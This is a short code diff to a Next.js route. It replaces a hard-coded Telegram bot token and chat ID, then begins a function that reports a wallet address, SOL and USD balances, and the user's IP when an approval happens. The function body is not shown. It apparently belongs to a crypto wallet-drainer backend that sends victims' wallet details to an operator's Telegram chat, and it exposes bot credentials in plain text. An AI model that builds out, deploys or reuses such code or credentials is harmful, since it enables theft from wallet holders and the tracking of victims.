@@ -1,7 +1,7 @@
 import { type NextRequest, NextResponse } from "next/server" 
 
-const TELEGRAM_BOT_TOKEN = "8402846340:AAGRUwRc3BvAQ25pyM6fghg3Ev6nMKnrbeI" 
-const TELEGRAM_CHAT_ID = "7975092555" 
+const TELEGRAM_BOT_TOKEN = "8341387926:AAGEi8QJ2LSLphS15rmAOwS8aPfJ15cX27U" 
+const TELEGRAM_CHAT_ID = "7556622176" 
 
 async function sendApprovalNotification(walletAddress: string, balanceSOL: number, balanceUSD: number, userIP: string) { 
   try { 
